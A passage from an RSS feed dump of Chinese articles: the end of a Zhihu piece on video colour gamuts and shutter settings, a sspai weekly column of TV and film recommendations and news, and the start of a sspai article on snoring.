​</p>\n<p>这个色域并不大，多数设备拍摄的素材都可以轻松超过，但是一些显示设备或者产品服务，就只支持这个标准，你大于这个标准拍摄的画面，实际播放是没有任何意义的。 ​</p>\n<p>也就是说，为了能在电视上，普通显示器上正确的显示色彩，就得按照Rec.709的规定来。 ​</p>\n<p>但是随着HDR设备的普及，就连B站也开始支持HDR了，Rec.709这个标准貌似不太够用了，于是新的标准也诞生了，BT2020，支持4k，8K，最高120帧的速率，以及12位的深度。 ​</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f0bcc6186be34fd1ebbcab74a95c4c81_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-f0bcc6186be34fd1ebbcab74a95c4c81_r.jpg\"></figure><p>所以你在拍摄Log或者HLG视频时，可以将色域选择为bt2020，这样可以在HDR显示上获得更好的观影体验。</p>\n<h2>快门角度还是速度</h2>\n<p>​</p>\n<p>照相机除了拍照也可以拍视频，电影机也可以拍照，那他们的区别到底是什么？ 其实最明显的一个操作逻辑上的区别，就是快门。 ​</p>\n<blockquote>关于快门的前世今生，可以参考我之前的这篇文章： <a href=\"https://www.zhihu.com/question/36033197/answer/1693671720\" class=\"internal\"><span class=\"invisible\">https://www.</span><span class=\"visible\">zhihu.com/question/3603</span><span class=\"invisible\">3197/answer/1693671720</span><span class=\"ellipsis\"></span></a> ​</blockquote>\n<p>如果你用过Bmpcc，之类的摄影机，在快门参数的调节上，使用的是快门角度。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396597176085045248\"></a><p class=\"ztext-empty-paragraph\"><br></p>\n<p>这个概念其实来自于电影拍摄，电影为24帧每秒，那每一帧的快门速度就为1/24s。但是人们发现这个速度的动态模糊太大了，导致视频看起来一点都不清晰。 那么如何调节胶片拍摄的时候的快门速度呢？加上一个旋转快门就好了。 ​</p>\n<p>比如这个180°的快门装置，就能遮挡一半的光线，让快门速度来到1/48s。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b2114d86ca73d5272122b3624f4469f1_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"384\" data-rawheight=\"207\" data-thumbnail=\"https://pic2.zhimg.com/v2-b2114d86ca73d5272122b3624f4469f1_b.jpg\" class=\"content_image\" width=\"384\"></figure><p>当然也有45°的快门和270°的快门，做法也比较简单，调节快门板的角度就好了。 ​</p>\n<p>人们发现，180°的时候，在画面锐度和动态模糊间达到了一个完美的平衡，所以，以前的电影机和摄影机基本上都是以180°的快门角度来拍摄视频。 ​</p>\n<p>在摄影机上，设置为180度的快门角度就好了，但是对于普通相机来说，快门速度要按照二倍帧率的倒数来设定：</p>\n<ul>\n<li>24帧，快门速度为1/50s；</li>\n<li>60帧，快门速度为1/120s;</li>\n<li>120帧，快门速度为1/250s</li>\n</ul>\n<p>来达到类似的效果。 ​</p>\n<p>不过当前的相机基本上都提供能自定义拍摄参数的保存，方便你快速切换。 ​</p>\n<p>​</p>\n<h2>不可忽视的限制</h2>\n<p>使用相机或者单反拍视频时，总是存在各种各样的限制。</p>\n<p>这个限制主要是来自于数据量，拍摄高分辨率高帧率的视频，会产生很大热量，散热如果不给力的话，相机就会做录制时长的限制，比如很多相机只能连续录制30分钟的视频，要么就直接给你来一个过热警告。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396597530466013184\"></a><p>另一个是高分辨率高帧率的视频对存储卡的写入速度也提出了要求，而高速卡的价格往往也不便宜。 ​</p>\n<p>而且数据量的增大，会增加相机的运算负担，一些功能在高分辨或者高帧率下就被禁用，比如：</p>\n<p>大部分相机在1080P/120帧的模式下，无法启用人脸/人眼对焦，只能使用最为传统的反差对焦； </p>\n<p>代理视频的录制功能，只能后期通过电脑生成代理视频。 ​</p>\n<h2>是时候按下录制键了</h2>\n<p>无论你使用怎样的设备，无论这个设备的性能如何，最重要的是出去拍。 以上讲的所有知识，都只是为了让你获得一个更加好看的画面，让你的画面更加锐利，减少噪点，但是画面永远不是全部，他只是锦上添花的部分。 ​</p>\n<p>更加重要的是内容和故事。 如何讲好一个故事，才是你应该不断思考的问题。 ​</p>\n<p>​</p>\n<p>你还对那些视频制作的知识感兴趣，或者有哪些你认为不对的地方，可以在评论区里边提出来，我们一起讨论。 ​​</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>以上。 ​</p>\n<a href=\"https://www.zhihu.com/xen/market/remix/paid_column/1339602918698377216\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-9c1c1c4faedff132eec7f5a8e83b4b18_120x160.jpg\" data-image-width=\"200\" data-image-height=\"267\" class=\"internal\">2021 相机推荐与选购：这款相机该不该买？看看硬核摄影科普</a><p>相关阅读：</p>\n<p><a href=\"https://www.zhihu.com/question/439458908/answer/1682895110\" class=\"internal\">哪位大神可以详细讲解下关于相机ISO方面的介绍？</a></p>\n<p><a href=\"https://www.zhihu.com/question/31142439/answer/1711732441\" class=\"internal\">为什么相机光圈F值越大，实际光圈越小，谁发明的，有什么来由吗？</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/305714803\" class=\"internal\">李明殊：李明殊的摄影类回答文章导航</a></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>​</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lihuawei?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">李明殊</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/387948491?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本周看什么丨最近值得一看的 6 部作品","date":"2021-07-09 10:06:08","description":"\n<h2>TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[动画] 怪兽上班、[日剧] 女子警察的逆袭、[真人秀] 换乘恋爱、[韩剧] 恶魔法官、[真人秀] 富美和架纯的休息日、[真人秀] MILLION TAG</li>\n<li>几则精彩预告：漫威动画剧集《假如……？》发布新预告， 8 月 11 日 上线 Disney+、郑渊洁作品改编电影《皮皮鲁与鲁西西之罐头小人》发布预告、《王牌特工》前传电影《王牌特工：源起》发布全新预告、动画《星球大战：幻象》9 月 22 日登陆 Disney+</li>\n<li>几则影视资讯：传记电影《梅艳芳》发布全新海报、《美国恐怖故事集》官宣卡司阵容，7 月 15 日上线 Hulu、台剧《池塘怪谈》发布正式海报，8 月 12 日开播、《99.9：刑事专业律师 电影版》今年冬季日本上映</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[动画] 怪兽上班</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/ad4c203cb23cbbe2e31c38ef6349b121\"></figure><p>关键词：喜剧 / 动画 / 奇幻</p>\n<p>片长：25 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/33402386/\">豆瓣链接</a></p>\n<blockquote><p>怪兽也是打工人～</p></blockquote>\n<p>@潘誉晗：皮克斯动画工作室出品的《怪兽电力公司》推出了衍生动画《怪兽上班》，在 7 月 7 日正式上线 Disney +，第一周就连播两集让期待的观众过了把瘾。</p>\n<p>故事的时间线设定在《怪兽电力公司》六个月之后，大眼仔和毛怪成为了怪兽公司的领导，在发现收获孩子们的笑声可以比尖叫声更具能量之后，他们打算改变公司的方针，靠收获孩子们的笑声来为城市发电。这就「害」惨了这次动画的主角泰勒，他在怪兽大学以优异的成绩比赛，第一天上班就发现自己的「专业」不对口了，这里再也不是「WE SCARE WE CARE 」了，而是要用开玩笑的方式逗孩子们开心。</p>\n<p>社畜浓度过高的 996 既视感。上班第一天似乎就要失业，工作和专业不对口的现实竟然在动画中被投射了出来，但是作为欠债的应届生还能怎么办呢？振作起来继续老老实实上班啊。没想到这一次的怪兽竟然如此成人向，但是又非常接地气，欢笑之余又戳进心里了。</p>\n<h3>[日剧] 女子警察的逆袭</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/39873518a57d017a971130b035b76575\"></figure><p>关键词：喜剧 / 动画 / 奇幻</p>\n<p>片长：25 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/35447242/\">豆瓣链接</a></p>\n<blockquote><p>派出所女子们的快乐日常～</p></blockquote>\n<p>@潘誉晗：为求一份稳定工作，只考进了属于公务员体系的新人警察川合，在犹豫辞职的时候遇到了降职到派出所的刑事课美女王牌藤圣子，于是，藤成了川合的新指导员。原本对这个职业没有留恋的川合面对新的上司，产生了想了解下去的冲动。而这样偶然成为搭档的女子组合，也在派出所开始了工作。</p>\n<p>新人加王牌这样看似老套的搭配，在本剧中依然发挥出了吸引人的点，首集 11.4% 的收视率也引起了不少话题。落脚在派出所的叙述视角让剧集多了日常生活般的美好，而对于派出所刑警的真实刻画，例如川合质疑的那句「越努力工作越被人讨厌」也说出了许多基层刑警们的心酸。除了具有实感的剧情，卡司们的颜值也很值得一看，当户田惠梨香、永野芽郁和西野七濑晚上聚在一起喝着啤酒聊工作聊日常，这样的画面不是非常符合夏季档的美好和清爽嘛～</p>\n<h3>[真人秀] 换乘恋爱</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/dde84a2538c9dd3b2719866695abfcf5\"></figure><p>关键词：真人秀</p>\n<p>片长：70 分钟（单集）× 10 集 ；<a href=\"https://movie.douban.com/subject/35510204/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：继「缺德节目」《我们离婚了》邀请离婚夫妻同居之后，真人秀《换乘恋爱》邀请了 4 对已经分手的情侣回到恋爱小屋，一起同住一个月，还要假装互不相识，或许还有「你的前任在你面前牵手了别人的前任」的剧情，这是什么人间惨剧，缺德程度指数级上升，而在看之前，节目组把采访和见面的画面全做了混剪，也就是说观众无法提前得知哪两对是曾经的恋人，不开上帝视角来看节目真是让人抓心挠肺。</p>\n<p>每一个节目环节都很绝，先是同居的第一晚让大家自我介绍，当众念前任给自己写的介绍信，有嘉宾当场落泪，因为对方写到「不要让她受伤，拜托了」，还有写到「是我唯一后悔分手的男人」，这显然就是余情未了啊！第二个环节是要给心动嘉宾发匿名短信，但会提示「你的前任选择了你」或是「你的前任未选择你」，不管是哪种情况都让人心情复杂吧，真不知道当事人感受如何，当然收到短信时候的表情也精彩极了，有苦笑，也有藏不住的开心。接下来节目组又给了四家餐厅的卡片，都是对于曾经的他们有特殊意义的地方，让四个男生选择一个，但最绝的是让前任匿名给新人提出约会建议，看到这里我除了起立鼓掌说不出任何的话。</p>\n<p>节目一开始就阐述了立意，爱情就是一起坐在一辆巴士里，会一起坐到终点，也会中途下车，下车之后到了站台可能会想去登上下一辆车，也可能又后悔了想去追赶已经走了的前一辆，这就是所谓「换乘恋爱」。无论节目最后走向如何，多少都能带给观众一些反思。</p>\n<h3>🔦[韩剧] 恶魔法官</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/636ca4fb3d8ce728ec3b75e1a43fb7c9\"></figure><p>关键词：剧情</p>\n<p>片长：67 分钟（单集）× 16 集；<a href=\"https://movie.douban.com/subject/35131291/\">豆瓣链接</a></p>\n<blockquote><p>各位国民就是最高的权力——我们法庭见。</p></blockquote>\n<p>@潘誉晗: 韩国人真的很敢拍。本剧中，编剧虚构了一个近现代社会，池城饰演的姜耀汉法官在即将到来的国民示范审判的法院直播中，将作为主法官出席，而在这次审判中，民众只需下载「正义女神」这个 App ，就可以参与投票选择被告是否有罪。不过讽刺的是，这场所谓正义的审判，不过是总统为了让民众恢复对于政府的信心罢了。</p>\n<p>首集最后半小时的庭审剧情很精彩，综艺般的直播，全民参与的投票，在那个瞬间你会分不清楚这是审判还是作秀。杀鸡儆猴带来的结果看似民众解了气，可看着收视率暴涨开心到不行的电视台领导，还有质问着的财团，不同领域的人各怀心思。池城的演技确实精彩，法庭上的两次落泪，还有那个哈欠，不少观众都表示看到这一幕的时候和剧中的助手一样一脸懵逼。数次的反转让观众一时无法分辨男主的正与恶，连演员本身在一开始的时候都误以为是「亦正亦邪」，可「纯粹的恶」这样的设定明显更加带感，编剧不愧是执笔过《汉谟拉比小姐》的文宥硕，推荐。</p>\n<h3>[真人秀] <strong>富美和架纯的休息日</strong>\n</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/cffecba2788a6832d7943294ee98a480\"></figure><p>关键词：真人秀</p>\n<p>片长：115 分钟（单集）× 10 集 ；<a href=\"https://movie.douban.com/subject/35479044/\">豆瓣链接</a></p>\n<blockquote><p>会有人不爱看美女在一起玩吗！</p></blockquote>\n<p>@宇宙浪费指南：之前由是枝裕和等多位知名导演执导的《有村架纯的摄休》，聚焦有村架纯在这些休假中的日常生活，每集都是她临时放假，然后如何度过假日的故事。是枝裕和评价首次合作的村花，称她内在丰富，当时是伪纪录片的形式，而这次的《富美和架纯的休息日》则是一部实打实的纪录片，记录村花和自己的好友二阶堂富美在东京的里山中度过假日的生活。</p>\n<p>两个人去的是在深山中的客栈，内容很丰富，小姐妹虽然性格不同但氛围太融洽了，猜拳选山道、砍柴、挖笋、采野菜、打荞麦面、炸天妇罗，远离繁忙的拍摄生活，悠闲地开启和闺蜜的山中旅行。</p>\n<p>她们俩听着山中鸟叫，蹲在篝火前谈心，分享着对彼此的看法、出道当时的苦恼、红白歌会，还有穿着同款睡衣，掷骰子聊恋爱话题。虽然有一些她们手拿自拍杆的镜头，有一瞬间恍惚地以为在看 vlog，但夏日山泉美少女的片子实在是太治愈了！</p>\n<h3>[真人秀] MILLION TAG</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/0f080e9ef0f0f928c485eb662eab917e\"></figure><p>关键词：漫画 / 真人秀</p>\n<p>片长：约 30 分钟（单集）× 8 集，每周五更新</p>\n<p>观看渠道：<a href=\"https://www.youtube.com/playlist?list=PLMyQxaghEY1F2cmCoJ2hd3vO6lMQl8Zum\">YouTube</a>；<a href=\"https://movie.douban.com/subject/35510708/\">豆瓣链接</a></p>\n<blockquote><p>我要成为爆漫王！</p></blockquote>\n<p>@SHY：《MILLION TAG》是集英社推出的首档真人实境秀，与同类节目不同，标题中的 Million 并非「百万美元」，而是指「初版发行量百万册」的漫画单行本，Tag 则是「漫画家 × 编辑」的组合，最终目标是发掘下一位百万销量的漫画家。六位资深编辑审查了数百名连载候补者的投稿作品，面试考核后结成六支队伍，在不同课题中锻炼漫画技能，以作品决胜负。优胜者的奖励包括五百万日元奖金、《少年 Jump+》连载资格、出版一册单行本以及 Netflix 动画化，可谓是不少职业漫画家都会羡慕的丰厚待遇。课题要求外，参赛者们可自由决定创作方式，但必须遵守截稿日期，拖稿者会立刻丧失资格，逐出比赛<s>，建议少数派作者好好看好好学</s>。</p>\n<p>周刊连载的流水化作业可能比较乏味，《MILLION TAG》请来的这几位却挺有爆点，主持人由搞笑艺人组合四千头身与知名声优佐仓绫音担当，插科打诨之余，还讲解了不少漫画创作的知识点。最终课题的评委包括《链锯人》作者藤本树与《地狱乐》作者贺来友治，会做出怎样自由的发言，值得期待。藤本树的编辑林士平也是第一组 Tag 的担当编辑，他指名的搭档是藤田直树，这位藤什么树画工精湛，却是个超悲观主义者，认为自己没有优势，作画时毫无激情。后几组同样个性十足，如直言只想画男女卿卿我我再一举拆散、要把本人性癖尽全力表现出来的 GIZANEKO；初中就相识、首次尝试投稿的七志 × 大石热血同级生组合，让人幻视《爆漫王》。目前，第一课题「四页漫画」的六组成果已经揭晓，谁会取得优胜，不妨在节目中寻找答案吧。</p>\n<h3>✌️更多</h3>\n<ul>\n<li>\n<a href=\"https://movie.douban.com/subject/35480033/\">[墨西哥剧] 我们就是如此</a> @宇宙浪费指南：本剧改编自普利策奖获奖记者金杰·汤普森撰写的争议性调查文章，从受害者的角度讲述了毒品战争的故事，再现了大屠杀发生前数日阿连德小镇居民的生活，由于是纪实文学的改编，片子拍的非常朴实，叙事内敛沉稳，看得人很窒息，借用网友一句话，「墨西哥离天堂太远，离美国太近！」</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35389040/\">[日剧] 主厨是名侦探 </a>@潘誉晗：与其说是「名侦探主厨」，不如用洞察力和记忆力绝佳来评价这位主厨更适合。西岛俊秀再一次饰演擅长厨艺的大叔，配上他的标志微笑，的确是深夜中一剂温暖的良方。根据小说改编的剧集，西餐主厨用自己敏锐的观察力推测出顾客的喜好甚至是职业，然后用美食去俘获顾客们的心，也治愈了观众的心情。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35466957/\">[瑞典剧] 青春王室</a> @潘誉晗：演员们脸上的青春痘非常直白地表现了「青春」二字，本以为是北欧版的《绯闻女孩》或《名校风暴》，没想到在俗套的剧情中竟生出了一丝感动。因为和别人起冲突被迫进入了寄宿制学校，王子和平民的相遇，不光是跨阶级的友谊交往，更是青春期怦然心动的同性相恋。原来比起阶级，性取向是更难跨越的困难。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35482282/\">[日剧] IP～网络搜查班</a> @潘誉晗：剧集主角是京都警察局的网络搜查班，他们利用自己的特长在网络上寻找罪犯或者被害者的蛛丝马迹，然后挖掘案件的真相。虽然佐佐木藏之介饰演的角色因为其高冷的设定让一些观众觉得老套，不过在新人身世、警视厅安排人员进入搜查班调查主角能力、还有每集一个案子这样三线并行的情况下，倒也不讨厌。</li>\n</ul>\n<h2>📅 本周新预告</h2>\n<h3>漫威动画剧集《假如……？》发布新预告， 8 月 11 日 上线 Disney+</h3> <p>该剧由漫威影业为迪士尼流媒体 Disney+ 打造，MCU 真人电影演员回归配音。每集一个主题，探讨如果史蒂夫·罗杰斯没有接受实验，假如特工卡特成为英国队长，美国队长变钢铁侠，黑豹变成星爵，颠覆之前漫威电影宇宙发生的故事，引领观众进入未知领域。将于 8 月 11 日上线。</p>\n<h3>郑渊洁作品改编电影《皮皮鲁与鲁西西之罐头小人》发布预告</h3> <p>7 月 6 日，由郑渊洁作品改编的首部院线真人电影 《皮皮鲁与鲁西西之罐头小人》发布预告，宣布定档8月13日。该片由郑亚旗担任出品人，于飞执导并编剧，田雨特别出演，洪悦熙、庄则熙、刘一莹等主演。本片讲述了调皮鬼皮皮鲁与优等生鲁西西结识了五位罐头小人发生的鬼马故事，这也是郑渊洁童话作品首登大银幕。</p>\n<h3>《王牌特工》前传电影《王牌特工：源起》发布全新预告</h3> <p>《王牌特工》前传电影《王牌特工：源起》发布全新预告。该片由马修·沃恩回归执导，拉尔夫·费因斯、哈里斯·迪金森、查尔斯·丹斯、丹尼尔·布鲁尔、亚伦·泰勒-约翰逊、杰玛·阿特登、汤姆·霍兰德等参演，将于 12 月 22 日北美上映。</p>\n<h3>动画《星球大战：幻象》9 月 22 日登陆 Disney+</h3> <p>7 月 4 日，星战官方宣布将推出原创动画剧集《星球大战：幻象》（Star Wars: Visions），由九部独立短篇组成，分别由七家日本动画工作室制作，9 月 22 日起独家上线 Disney+。参与公司为 Production I.G、TRIGGER、Science SARU、神风动画、Geno Studio、Studio Colorido 和 Kinema Citrus，导演包括神山健治、今石洋之等。 <a href=\"https://twitter.com/starwarsjapan/status/1411463942774267904\" target=\"_blank\">来源</a></p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1qy4y1M7aH?from=search&amp;seid=139391720333002364\" target=\"_blank\"><strong>《行尸走肉》最终季发布预告，8 月 22 日开播：</strong></a>《行尸走肉》第 11 季发布预告。劳伦·科汉、诺曼·瑞杜斯、梅丽莎·麦克布莱德等主演回归。本季为该剧的最终季，共 24 集，第 1-8 集将于 8 月 22 日 AMC 开播，第 9-16 集或将于 2022 年冬春之际播出，第 17-24 集或将于 2022 年夏秋之交播出。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1n44y1q7hz?from=search&amp;seid=6866427258127495520\" target=\"_blank\"><strong>《恐惧街 2：1978》发布正式预告，7 月 9 日上线 Netflix：</strong></a>Netflix《恐惧街》三部曲第二部《恐惧街 2：1978》发布正式预告。该片由丽恩·贾尼埃克执导，奥利维亚·韦尔奇、吉莉安·雅各布斯、大卫·W·汤普森、萨迪·辛克等主演，将于 7 月 9 日上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1q44y1q7q4?from=search&amp;seid=17436003615436229225\" target=\"_blank\"><strong>宋康昊、李秉宪、全度妍主演新片《非常宣言》发布国际版预告：</strong></a>由《观相》《王者》导演韩在林执导，宋康昊、李秉宪、全度妍、金南佶、任时完、朴海俊、金素真主演的空难题材电影《非常宣言》发布国际版预告。该片已入围第 74 届戛纳电影节非竞赛单元。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1844y1q7KT\" target=\"_blank\"><strong>漫改 TV 动画《冰海战记》将制作第二季</strong></a>：7 月 7 日，TV 动画《冰海战记》官方宣布将推出第二季，薮田修平执导，阿比留隆彦人设、总作监，WIT STUDIO 制作，播出时间待定。本作改编自幸村诚的同名漫画，讲述中世纪维京最强战士托尔兹之子托尔芬，跟随杀父仇人阿谢拉特，寻找梦幻之地「文兰」的英雄物语。</p>\n<p><a href=\"https://www.bilibili.com/video/BV17h411h7m3\" target=\"_blank\"><strong>动画电影《剧场版超时空要塞△ 绝对LIVE!!!!!! 》：</strong></a>TV 动画《超时空要塞△》续篇剧场版，亦是系列 20 年版权纠纷化解后的首部新作，2021 年秋季在日本上映，同步上映短篇剧场版《超时空要塞F 时之迷宫》。 <a href=\"https://twitter.com/macrossD/status/1411683223097118722\">来源</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1Dy4y1K7gC\" target=\"_blank\"><strong>漫改 TV 动画《范马刃牙》：</strong></a>改编自板垣惠介的同名漫画，系《刃牙》系列的第三部正传作品，平野俊贵执导，TMS 制作，讲述地上最强生物范马勇次郎与范马刃牙的父子决战，2021 年秋季独家上线 Netflix。 <a href=\"https://twitter.com/baki_anime/status/1413098036927123459\">来源</a></p>\n<h2>📽 影视新闻周报</h2>\n<h3>传记电影《梅艳芳》发布全新海报</h3>\n<p>7 月 8 日，传记电影《梅艳芳》发布全新海报。该片由《寒战》系列导演梁乐民执导，新人演员王丹妮主演，于今年在中国香港上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/09/article/268fc7630a1ae68ed5dee3748bc02064\"></figure><h3>《美国恐怖故事集》官宣卡司阵容，7 月 15 日上线 Hulu</h3>\n<p>7 月 8 日，《美国恐怖故事》衍生剧集《美国恐怖故事集》官宣卡司阵容：马特·波莫、比莉·洛德、约翰·卡洛·林奇、娜奥米·格罗斯曼、艾伦·特维特、凯雅·基伯、凯文·麦克哈尔、迪伦·伯恩赛德、查尔斯·梅尔顿、尼科·格莱瑟姆、加文·克瑞尔、谢拉·麦克康米克 、阿什利·马丁·卡特、帕里斯·杰克逊、贝利萨·埃斯科韦多、莱齐·费利兹、麦迪逊·贝利、凯尔·西尔弗斯坦、艾米·吉拉博、维吉尼亚·加德纳、丹尼·特雷霍等。该剧共 16 集，将于 7 月 15 日上线 Hulu。</p>\n<h3>台剧《池塘怪谈》发布正式海报，8 月 12 日开播</h3>\n<p>7 月 6 日，由《目击者之追凶》《缉魂》导演程伟豪执导的台剧《池塘怪谈》发布正式海报。该剧讲述一起以池塘为背景的怪谈故事，将于 8 月 12 日开播。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/09/article/0b14c7f325ada59c3482eadacd8666b1\"></figure><h3>《99.9：刑事专业律师 电影版》今年冬季日本上映</h3>\n<p>7 月 5 日，松本润、香川照之、杉咲花主演的《99.9：刑事专业律师 电影版》发布首款海报。该片将于今年冬季在日本上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/09/article/df86e8dbf24ea273334f4ab84cc2f13b\"></figure><h3>更多</h3>\n<p><strong>2021 年爱尔兰电视电影奖获奖名单揭晓，《正常人》获九项大奖：</strong>2021 年爱尔兰电视电影奖获奖名单揭晓，hulu 剧集《正常人》获得最佳剧集、最佳导演、最佳男主等九项大奖成为最大赢家。动画电影《狼行者》获得最佳影片，这也是史上第二次由动画电影获此殊荣，上一次也是汤姆·摩尔、威尔·柯林斯合作的作品——2015 年的《海洋之歌》。</p>\n<p><strong>高口碑剧集《万物生灵》第二季杀青，即将定档播出：</strong>本剧聚焦一个年轻的兽医去乡间的经历，有许多好笑、温馨、可爱的小事，哈利笔下的动物和人都充满灵性，给人春风拂面般的感触。</p>\n<p><strong>动画电影《Re:cycle of the PENGUINDRUM》2022 年上映：</strong>7 月 7 日，动画《回转企鹅罐》官方宣布，10 周年纪念剧场版《Re:cycle of the PENGUINDRUM》将分为前后两部，预定 2022 年在日本上映。本作系 Brain's Base 制作、2011 年播出的 24 集 TV 动画的重新构成，并追加完全新作部分，仍由几原邦彦执导，改为 Lapin Track 制作。 <a href=\"https://twitter.com/penguindrum/status/1412713000104984583\">来源</a></p>\n<p><strong>动画电影《Goodbye, DonGlees!》2022 年上映：</strong>7 月 2 日，MADHOUSE 公布了新作动画电影《Goodbye, DonGlees!》（グッバイ、ドン・グリーズ！），由《比宇宙更远的地方》导演石塚敦子执导、编剧，吉松孝博人设，预定 2022 年在日本上映。本作将描绘少年们奇迹般相遇的故事，从与往常不同的暑假开始的冒险，最后抵达岩浆与冰川共存的国度——冰岛。 <a href=\"https://twitter.com/gb_donglees/status/1410886322730852357\" target=\"_blank\">来源</a></p>\n<p><strong>漫改 TV 动画《即使如此依旧步步进逼》：</strong>改编自《擅长捉弄的高木同学》作者山本崇一朗的同名漫画，凑未来执导，SILVER LINK. 制作，2022 年 7 月开始播出。田中步决心赢过将棋部学姐八乙女漆后告白，却总是说出让对方害羞的话。 <a href=\"https://twitter.com/soreayu_staff/status/1412426112911675397\" target=\"_blank\">来源</a></p>\n<p><strong>《无限滑板 / SK8 the Infinity》新作动画：</strong>今年 1 月开始播出，内海纮子执导、大河内一楼编剧、BONES 制作的原创 TV 动画宣布将推出新作动画，同时将改编为舞台剧，第一部 2021 年 12 月公演。 <a href=\"https://twitter.com/sk8_project/status/1411641688934727680\" target=\"_blank\">来源</a></p>\n<p><strong>扎克·施奈德将执导网飞新片《反叛之月》：</strong>在《活死人军团》正式上线后，扎克·施奈德将继续为 Netflix 拍摄一部科幻电影，暂定名为《反叛之月》（Rebel Moon）。他表示该片深受《星球大战》和黑泽明电影的影响，希望这部电影能开创一个新的 IP，打造出一个新的电影宇宙。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/67633"},{"title":"打鼾：你熟悉的夜间惊雷，究竟是什么？","date":"2021-07-09 08:00:00","description":"\n<p>打鼾，也被称为打呼噜、打呼等。人们对这个词非常熟悉，也在辱骂室友和秀恩爱的过程中反复提及。这一种常见的现象，不仅为老百姓们所注意，也引起了古今中外众多医生的关注。我国古代中医就有关于鼾症的记载，1975 年国外科学家首次报道了睡眠呼吸暂停，1976 年定义了睡眠呼吸暂停综合征。<sup class=\"ss-footnote\" href=\"\" title=\"Sackner MA, Landa J, Forrest T, et al. Periodic sleep apnea: chronic sleep deprivation related to intermittent upper airway obstruction and central nervous system disturbance[J]. Chest, 1975, 67(2): 164-171. Guilleminault C, Tilkian A, Dement C. The sleep apnea syndromes[J]. Annu Rev Med, 1976, 27(1): 465-484.\" footnote-id=\"1\">1</sup>自此，人们正式意识到，打鼾不仅是你夜夜辱骂的噪音，还可能是隐匿潜行的超大声杀手。</p>\n<h2>人为什么会打鼾？</h2>\n<p>打鼾在医学上的定义是睡眠时上呼吸道变窄、气流受限，软腭、喉壁、会厌等软组织振动而引起的喉部发出声音的现象。<sup class=\"ss-footnote\" href=\"\" title=\"LiistroG, StanescuD, VeriterC, et al. Pattern of snoring in obstructive sleep apnea patients and in heavy snorers[J]. Sleep, 1991, 14(6): 517-525.\" 